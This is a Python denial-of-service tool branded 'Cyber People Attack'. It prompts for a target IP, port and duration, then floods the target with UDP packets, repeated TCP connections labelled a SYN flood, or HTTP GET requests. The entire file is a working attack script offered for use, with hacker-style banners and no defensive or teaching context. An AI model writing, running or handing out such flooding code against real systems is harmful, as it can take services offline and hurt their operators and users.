# @Zeb4nk
from termcolor import colored
import sys
import os
import time
import socket
import random

# Clear the terminal
os.system("clear")
os.system("figlet  Cyber People Attack ")
print(colored("V.01.1",'yellow'))
print()
print("""\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━|
\033[33m[<>] Author1. ➠  : \033[4;32mAbdullah AL Asad\033[24;34m         ├
\033[33m[<>] Author2. ➠  : \033[4;32mPoison\033[24;34m                   ├
\033[33m[<>] Author3. ➠  : \033[4;32mZeb4nk\033[24;34m                   ├
\033[34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━|
\033[5;31mXXXXxxx\033[37m>>>>\033[30m━━━━━━━━•⚔️☠️☠️⚔️•━━━━━━━━\033[37m<<<<\033[31mxxxXXXX
  \033[31mXXXXxxx\033[37m>>>>\033[30m━━━━━━•⚔️☠️☠️⚔️•━━━━━━\033[37m<<<<\033[31mxxxXXXX
    \033[31mXXXXxxx\033[37m>>>>\033[30m━━━━•⚔️☠️☠️⚔️•━━━━\033[37m<<<<\033[31mxxxXXXX""")
print()

# Prompt for target IP and port
ip = input("\033[25;36mEnter the target IP: ")
try:
    port = int(input("Enter the target port: "))
except ValueError:
    print("Invalid port. Exiting...")
    sys.exit()

# Prompt for attack duration
try:
    dur = int(input("Enter the duration of the attack in seconds: "))
except ValueError:
    print("Invalid duration. Exiting...")
    sys.exit()

# Function to perform the UDP Flood attack


def udp_flood(ip, port, message, dur):
    # Create the UDP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Set a timeout for the socket so that the program doesn't get stuck
    s.settimeout(dur)

    # The IP address and port number of the target host
    target = (ip, port)

    # Start sending packets
    start_time = time.time()
    packet_count = 0
    while True:
        # Send the message to the target host
        try:
            s.sendto(message, target)
            packet_count += 1
            print(f"\033[32mCyber People Attack \033[37m-->> \033[33mSent \033[31mUDP packet ☠️☠️ {packet_count}")
        except socket.error:
            # If the socket is not able to send the packet, break the loop
            break

        # If the specified duration has passed, break the loop
        if time.time() - start_time >= dur:
            break

    # Close the socket
    s.close()

# Function to perform the SYN Flood attack
def syn_flood(ip, port, duration):
    sent = 0
    timeout = time.time() + int(duration)

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sent += 1
            print(f"\033[34mCyber People Attack sent SYN packets: {sent} \033[33mto ip target: {ip}")
            sock.close()
        except OSError:
            pass
        except KeyboardInterrupt:
            print("\n[*] Attack stopped.")
            sys.exit()
        finally:
            sock.close()  # Make sure to close the socket in all cases 
# Function to perform the HTTP Flood attack

def http_flood(ip, port, duration):
    # create a socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # create HTTP request
    http_request = b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"

    sent = 0
    timeout = time.time() + int(dur)

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            # Re-create the socket for each iteration
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.sendall(http_request)
            sent += 1
            print(f"\033[36mCyber People Attack sent HTTP packets: {sent} \033[33mto target: {ip}")
        except KeyboardInterrupt:
            print("\n[-] Attack stopped by user")
            break
    sock.close()


# Prompt for the type of attack
attack_type = input(colored(
    """Enter the type of attack (Choose Number) 
┏━━━━━━━━━━━━━━━━━━━━━
┣➤ 1.UDP
┣━━━━━━━━━━━━━━━━━━━━━
┣➤ 2.HTTP
┣━━━━━━━━━━━━━━━━━━━━━
┣➤ 3.SYN
┣━━━━━━━━━━━━━━━━━━━━━

""""Typing -->> : ",'green'))

if attack_type == "1":
    message = b"Sending 1337 packets baby"
    print(colored("UDP attack selected", "red"))
    udp_flood(ip, port, message, dur)
    print(colored("UDP attack completed", "red"))
elif attack_type == "3":
    print(colored("SYN attack selected", "red"))
    syn_flood(ip, port, dur)
elif attack_type == "2":
    print(colored("HTTP attack selected", "red"))
    http_flood(ip, port, dur)
else:
    print(colored("Invalid attack type. Exiting...", "green"))
    sys.exit()
